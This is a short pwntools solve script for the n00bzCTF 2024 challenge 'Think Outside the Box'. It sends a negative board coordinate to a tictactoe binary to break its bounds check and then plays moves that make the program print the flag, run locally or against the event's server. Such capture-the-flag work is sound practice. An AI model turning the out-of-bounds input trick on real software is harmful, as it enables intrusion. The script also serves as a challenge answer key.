#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/n00bzCTF 2024/pwn/Think Outside the Box/tictactoe')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.recvuntil(b'first!\n')
    [r.recvline() for x in range(5)]
    r.sendline(b'-1,0')

    r.recvuntil(b'Bot turn!\n')
    [r.recvline() for x in range(5)]
    r.sendline(b'0,0')

    r.recvuntil(b'Bot turn!\n')
    [r.recvline() for x in range(5)]
    r.sendline(b'0,1')

    r.recvuntil(b'Bot turn!\n')
    [r.recvline() for x in range(5)]
    r.sendline(b'0,2')

    r.recvuntil(b'Flag: ')
    print(r.recvline())
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('challs.n00bzunit3d.xyz', 10357)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
